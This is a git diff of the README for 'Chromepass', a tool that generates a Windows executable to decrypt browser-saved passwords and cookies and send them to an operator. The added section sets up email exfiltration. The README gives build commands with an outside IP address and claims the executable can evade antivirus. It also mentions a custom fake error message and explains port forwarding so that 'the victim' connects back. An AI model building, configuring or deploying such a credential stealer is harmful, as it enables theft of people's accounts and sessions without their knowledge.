@@ -46,6 +46,7 @@
   * [Prerequisites](#dependencies-and-requirements)
   * [Installation](#installation)
 * [Usage](#usage)
+* [Email](#email)
 * [Errors, Bugs and Feature Requests](#errors-bugs-and-feature-requests)
 * [Learn More](#learn-more)
 * [License](#license)
@@ -55,7 +56,7 @@
 Chromepass is a python-based console application that generates a windows executable with the following features:
 
   - Decrypt Google Chrome, Chromium, Edge, Brave, Opera and Vivaldi saved paswords and cookies
-  - Send a file with the login/password combinations and cookies remotely (http server)
+  - Send a file with the login/password combinations and cookies remotely (http server or email)
   - Undetectable by AV if done correctly
   - Custom icon
   - Custom error message
@@ -119,9 +120,33 @@ python create.py --ip 92.34.11.220 --error --message 'An Error has happened'
 
 After creating the server and the client, make sure you're running the server when the client is ran.
 
-The cookies and passwords will be saved in `json` files on a new folder called `data` in the same directory as the server, separated by ip address.
+The cookies and passwords will be saved in `json` files on a new folder called `data` in the same directory as the server, separated by ip address.  
 
+-- --
 
+## Email
+Chromepass supports sending the files via email, although it's still experimental.
+To enable this, you can use the `--email` flag while creating the server. You'll need two things, a username (your email) and a password (an app password).
+
+To generate an app password you must go into your `account settings` -> `Security` and enable 2-step authentication (required!)
+
+After 2-step authentication is enabled, you'll see a new option called `App Passwords`:
+![2-step-authentication](https://i.imgur.com/Ip3ShCI.png)
+
+You want to click there and then choose the appropriate options and then generate a password:
+![2-step-authentication](https://i.imgur.com/DoQQ4Qn.png) 
+
+After clicking `Generate` it will give you the needed password.
+You can use the username and password directly in the command or you can simply put it inside the `config.ini`, where it says `YOUR_USERNAME` and `YOUR_PASSWORD`.
+
+### Example with credentials in command
+```powershell
+python create.py --ip 92.34.11.220 --error --message 'An Error has happened' --email --username myuser@gmail.com --password qwertyuiopasdfghh
+```
+### If you put the credentials in the config file
+```powershell
+python create.py --ip 92.34.11.220 --error --message 'An Error has happened' --email
+```
 
 ### Remote Notes
 >If you'd like to use this in a remote scenario, you must also perform port forwarding (port 80 by default), so that when the victim runs the client it is able to connect to the server on the correct port.  
